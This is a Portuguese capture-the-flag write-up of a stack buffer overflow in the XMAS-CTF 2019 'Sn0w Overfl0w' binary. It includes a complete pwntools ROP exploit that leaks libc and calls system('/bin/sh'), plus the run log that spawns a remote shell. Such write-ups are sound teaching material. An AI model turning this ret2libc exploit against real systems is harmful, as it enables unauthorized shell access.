# Writeup "Sn0w Overfl0w" - XMAS-CTF 2019
## Categories: pwn, Return Oriented Programming (ROP), Buffer Overflow (BOF), leaking libc

A challenge nos oferece apenas um binário que o nomearemos como "chall".

Executando o binário, obtemos um prompt para "Helloooooo, do you like to build snowmen?" como demonstrado a seguir:
fex0r:~/.ctf/xmas-ctf/sn0w-overfl0w# ./chall                                                
Helloooooo, do you like to build snowmen?

Visualizando as chamadas para libraries que o binário faz, podemos reparar que ele executa um strcmp do nosso input com o texto "yes":
fex0r:~/.ctf/xmas-ctf/sn0w-overfl0w# ltrace ./chall
setvbuf(0x7fbbf81f3a00, 0, 2, 0)                                                                             = 0
setvbuf(0x7fbbf81f4760, 0, 2, 0)                                                                             = 0
puts("Helloooooo, do you like to build"...Helloooooo, do you like to build snowmen?)                         = 42
read(yes, "yes\n", 100)                                                                                     = 4
strcmp("yes\n", "yes")                                                                                       = 10
puts("Mhmmm... Boring..."Mhmmm... Boring...)

Na verdade, teriamos que introduzir o "yes" de forma que o caractere newline ("\n") nao entrasse no input, de forma que o strcmp retornasse true, porém todo esse processo demonstrou-se desnecessário ao analisarmos o binário com GDB e descobrirmos um buffer overflow no binário.

## Binário Stripped
Como se trata de um binário stripped, teremos que achar a função main manualmente, podemos fazer isso da seguinte forma:
```
1. fex0r:~/.ctf/xmas-ctf/sn0w-overfl0w# gdb ./chall
2. gef➤  info file
   Symbols from "/home/fex0r/.ctf/xmas-ctf/sn0w-overfl0w/chall".
   Local exec file:
           `/home/fex0r/.ctf/xmas-ctf/sn0w-overfl0w/chall', file type elf64-x86-64.
           Entry point: 0x401070
           0x00000000004002a8 - 0x00000000004002c4 is .interp
           0x00000000004002c4 - 0x00000000004002e4 is .note.ABI-tag
           .................. ................. .................
3. gef➤  b *0x401070
   Breakpoint 1 at 0x401070
4. gef➤  r
	Starting program: /home/fex0r/.ctf/xmas-ctf/sn0w-overfl0w/chall                                                              	                                         
	
	Breakpoint 1, 0x0000000000401070 in ?? ()
5. gef➤  x/20i $rip
   => 0x401070:    endbr64
      0x401074:    xor    ebp,ebp
      0x401076:    mov    r9,rdx
      0x401079:    pop    rsi
      0x40107a:    mov    rdx,rsp
      0x40107d:    and    rsp,0xfffffffffffffff0
      0x401081:    push   rax
      0x401082:    push   rsp
      0x401083:    mov    r8,0x401280
      0x40108a:    mov    rcx,0x401210
      0x401091:    mov    rdi,0x401167
      0x401098:    call   QWORD PTR [rip+0x2f52]        # 0x403ff0
      0x40109e:    hlt
      0x40109f:    nop
      0x4010a0:    endbr64
      0x4010a4:    ret
      0x4010a5:    nop    WORD PTR cs:[rax+rax*1+0x0]
      0x4010af:    nop
      0x4010b0:    mov    eax,0x404040
      0x4010b5:    cmp    rax,0x404040
```
Ok, o endereço do começo de main() é 0x401167. Mas como exatamente descobrimos isso?
No passo 2 e 3, obtemos e setamos um breakpoint para o entry point do binário, oque nada mais é que o ponto de entrada do programa, ali encontram-se as primeiras instruções de um binário, pois bem o push do endereço de main para __libc_start_main.
__libc_start_main será setado posteriormente, enquanto isso, podemos apenas assumir, que a chamada feita em 0x401098 se trata de uma "call __libc_start_main" e receberia como argumento 0x401167, o qual é mov'ido para o primeiro general purpose register $rdi a fim de ser usado como argumento para a função __libc_start_main. Logo, 0x401167 é o endereço de início da nossa função main.

## Entendendo o Execution Flow do programa e Identificando Buffer Overflow
Com a função main em mãos, podemos analisar ela via ghidra.
A função main decompilada se comporta da seguinte maneira:
```
undefined8 FUN_00401167(void)

{
  int iVar1;
  char local_12 [10];
  
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  puts("Helloooooo, do you like to build snowmen?");
  read(0,local_12,100);
  iVar1 = strcmp(local_12,"yes");
  if (iVar1 == 0) {
    puts("Me too! Let\'s build one!");
  }
  else {
    puts("Mhmmm... Boring...");
  }
  return 0;
}
```
É explícita a existência de um buffer overflow ao ler 100bytes de dados para uma variavel que suporta apenas 10.
Possuindo um BOF no binário, podemos pular para a parte da exploração, porem antes disso, precisamos checkar as proteções que o binário possúi:
```
fex0r:~/.ctf/xmas-ctf/sn0w-overfl0w# checksec ./chall 
[*] '/home/fex0r/.ctf/xmas-ctf/sn0w-overfl0w/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
"NX Enabled", No Execute esta ativado, isto é, a stack inteira se torna read-only, impossibilitando o clássico ataque de buffer-overflow consistindo na "alocação" e chamada do shellcode na stack.
A fim de burlarmos tal proteção, faremos um ataque do tipo Return Oriented Programming (ROP).

Nosso exploit final ficará da seguinte forma:
```
from pwn import *

p = remote("challs.xmas.htsp.ro", 12006)
elf = ELF("./chall")
libc = ELF("libc-2.27.so")
rop = ROP(elf)

pad = "A"*(18)
puts = elf.plt["puts"]
libc_start_main = elf.symbols["__libc_start_main"]
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

info("puts@plt => "+hex(puts))
info("__libc_start_main => "+hex(libc_start_main))
info("pop rdi => "+hex(pop_rdi))

rop = pad + p64(pop_rdi) + p64(libc_start_main) + p64(puts) + p64(0x401070)
p.sendlineafter("snowmen?", rop)
p.recvline()
p.recvline()
leaked__libc_start_main = u64(p.recvline().strip().ljust(8, "\x00"))
info("Leaked __libc_start_main@GLIBC => "+hex(leaked__libc_start_main))

libc.address = leaked__libc_start_main - libc.sym["__libc_start_main"]
libc_base = libc.address
info("libc base => "+hex(libc_base))

system = libc.sym["system"]
str_bin_sh = next(libc.search("/bin/sh"))

info("/bin/sh => %s " % hex(str_bin_sh))
info("system => %s " % hex(system))

xpl = pad + p64(RET) + p64(pop_rdi) + p64(str_bin_sh) + p64(system)
p.sendlineafter("snowmen?", xpl)

p.interactive()
```

## Pwning!!
```
fex0r:~/.ctf/xmas-ctf/sn0w-overfl0w# python xpl.py      
[+] Opening connection to challs.xmas.htsp.ro on port 12006: Done
[*] '/home/fex0r/.ctf/xmas-ctf/sn0w-overfl0w/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/fex0r/.ctf/xmas-ctf/sn0w-overfl0w/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loading gadgets for '/home/fex0r/.ctf/xmas-ctf/sn0w-overfl0w/chall'
[*] puts@plt => 0x40102c
[*] __libc_start_main => 0x403ff0
[*] pop rdi => 0x401273
[*] Leaked __libc_start_main@GLIBC => 0x7fb0ba683ab0
[*] libc base => 0x7fb0ba662000
[*] /bin/sh => 0x7fb0ba815e9a 
[*] system => 0x7fb0ba6b1440 
[*] Switching to interactive mode

Mhmmm... Boring...
$ cat flag.txt
X-MAS{700_much_5n0000w}
```
